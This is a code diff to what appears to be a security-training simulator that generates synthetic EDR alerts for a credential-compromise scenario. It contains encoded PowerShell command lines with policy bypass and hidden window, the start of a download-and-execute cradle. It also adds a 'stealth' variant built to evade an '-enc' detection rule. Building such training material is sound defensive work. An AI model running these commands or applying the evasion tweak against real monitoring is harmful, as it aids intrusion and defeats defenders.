@@ -187,7 +187,7 @@ export const CREDENTIAL_COMPROMISE_PLAN: AttackPlan =
           "Base64-encoded PowerShell launched with an execution-policy bypass and a hidden window. No business process on this host runs this way.",
         reasoning: () =>
           "PowerShell alone proves nothing; administrators and business tooling use it all day, which is why alerting on the binary produces noise rather than detections. The signal is the combination -- encoded payload, policy bypass, hidden window -- because each flag exists to defeat inspection and legitimate automation has no reason to use all three. Read the parent process next: what launched it tells you whether this followed the sign-in or came from something already resident.",
-        build: (cast) => ({
+        build: (cast, _index, evasion) => ({
           type: "PROCESS_STARTED",
           source: "edr",
           subjectId: cast.subjectDevice.id,
@@ -195,8 +195,12 @@ export const CREDENTIAL_COMPROMISE_PLAN: AttackPlan =
             deviceId: cast.subjectDevice.id,
             processId: "7734",
             image: POWERSHELL,
+            // The stealth variant obfuscates the flag and drops the hidden
+            // window, evading a rule keyed on `-enc`.
             commandLine:
-              "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+              evasion === "stealth"
+                ? "powershell.exe -nop -w 1 -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+                : "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
             parentProcessId: "4102",
             parentImage:
               "C:\\Windows\\explorer.exe",
